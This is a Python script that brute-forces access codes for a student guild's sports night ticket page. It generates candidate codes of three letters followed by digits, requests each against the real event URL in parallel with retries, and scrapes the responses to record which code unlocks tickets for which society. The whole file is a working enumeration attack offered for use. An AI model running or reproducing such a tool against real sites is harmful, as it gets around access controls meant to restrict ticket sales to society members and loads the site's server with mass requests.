# Program to automatically find access codes for sports night societies

from requests.adapters import HTTPAdapter, Retry
from bs4 import BeautifulSoup
from multiprocessing import Pool
from file_utils import save_dictionary_to_file
import requests
import threading
import time
import string


url = "https://www.guildofstudents.com/ents/event/9496/?code="

LOWER_LIMIT = 000
UPPER_LIMIT = 999

# list of every 6 digit number
# VALID_CODES = [str(i).zfill(6) for i in range(LOWER_LIMIT, UPPER_LIMIT + 1)]
VALID_CODES: list[str] = [f"{a}{b}{c}{x}{y}{z}" 
                          for a in string.ascii_uppercase 
                          for b in string.ascii_uppercase
                          for c in string.ascii_uppercase
                          for x in string.digits 
                          for y in string.digits 
                          for z in string.digits]

POSSIBLE_CODES: list[str] = [f"{a}{b}{c}300" for a in string.ascii_uppercase for b in string.ascii_uppercase for c in string.ascii_uppercase]

# dictionary of "society name" : "code"
codes: dict[str, str] = {}

session = requests.Session()
retries = Retry(total=10, backoff_factor=30, status_forcelist=[500, 502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retries))


def check_for_code(code: str) -> None:
    # print("[INFO] Checking code: " + code)

    page = session.get(url + code).text

    soup = BeautifulSoup(page, 'html.parser')

    inner_ticket_box = soup.find('div', class_="event_tickets")

    if inner_ticket_box is None:
        # print("[ERROR] Inner ticket box not found")
        return

    if len(inner_ticket_box.find_all('div', class_="event_ticket")) == 1:
        print("[INFO] Valid Code! " + code)
        # get the span inside the first div
        society_name = inner_ticket_box.find('div').find('span').text
        # format: £6.00 (Swimming)
        # Find the value in the brackets
        society_name: str = society_name[society_name.find("(") + 1:society_name.find(")")]
        print("[INFO] Society name: " + society_name)
        # save to the dictionary
        codes[society_name] = code
    else: 
        print("[ERROR] Unexpected number of DIVs... found: " + str(len(inner_ticket_box.find_all('div'))))
        print(["[DEBUG]", inner_ticket_box])


def iterate_over_all_codes() -> None:
    # codes can be any 6 digits, so iterate over all of them

    with Pool() as pool:
        pool.map(check_for_code, POSSIBLE_CODES)

    # for i in range(100):
    #     current_code = str(i).zfill(6)
    #     print("[INFO] Checking code: " + current_code)
    #     check_for_code(current_code)



if __name__ == "__main__":
    iterate_over_all_codes()
    save_dictionary_to_file(codes)